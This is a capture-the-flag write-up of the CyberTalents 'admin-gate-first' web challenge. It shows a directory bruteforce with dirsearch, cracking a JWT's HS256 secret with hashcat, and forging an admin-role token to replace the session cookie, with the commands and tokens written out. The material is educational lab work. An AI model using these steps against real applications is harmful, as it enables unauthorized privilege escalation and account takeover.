# Solve admin-gate-first
#### https://cybertalents.com/challenges/web/admin-gate-first

![alt text](images/image.png)
### Run Directory bruteforce
`dirsearch -u http://wcamxwl32pue3e6m51xvkoecl304j6zqdkgxu639-web.cybertalentslabs.com -x 403,404`
*you can find the output in [Directories.txt](Directories.txt)*


### Login with test/test
![alt text](images/image-1.png)

in the cookies we found a JWT token
`eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcInRlc3RcIixcInJvbGVcIjpcInVzZXJcIn0ifQ.XSPy0jZd8CEtHl2e3C1SjPaewco1tjO3iajbkJy2OFQ` 

### Decode with JWT.io 

```json
{
  "typ": "JWT",
  "alg": "HS256"
}

{
  "data": "{\"username\":\"test\",\"role\":\"user\"}"
}
```
### Crack the JWT HS256 Signature
```bash
hashcat -m 16500 -a 0 jwt.txt <wordlist>
```

we found the Signature `123456`

### Edit the JWT Token

```json
{
  "typ": "JWT",
  "alg": "HS256"
}

{
  "data": "{\"username\":\"test\",\"role\":\"admin\"}"
}
```
The new Token:
`eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcInRlc3RcIixcInJvbGVcIjpcImFkbWluXCJ9In0.jHijo7pYELY4DJG20h2xCRiKRqW3HCdB1AnyOGsTNUw`

edit the cookie with the new Token
![alt text](images/image-2.png)

### Resources 
[jwt.io](https://jwt.io/)
[jwt cracker](https://github.com/brendan-rius/c-jwt-cracker)
>Find More on ==> github.com/MedhatHassan 
